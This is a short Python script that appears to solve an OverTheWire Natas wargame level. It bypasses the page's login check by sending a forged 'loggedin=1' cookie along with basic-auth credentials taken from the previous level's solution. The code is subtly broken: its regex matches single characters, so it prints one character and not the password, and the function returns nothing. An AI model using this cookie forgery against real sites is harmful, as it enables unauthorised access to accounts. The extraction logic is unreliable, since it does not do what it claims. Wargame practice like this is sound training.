import re
import requests
from requests.auth import HTTPBasicAuth
import natas4solution

auth = HTTPBasicAuth('natas5', natas4solution.get_pass())
def get_pass():
    cook = {'loggedin': '1'}
    r = requests.get('http://natas5.natas.labs.overthewire.org/', auth=auth,cookies=cook)
    pass_regex = '[a-zA-Z0-9]'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
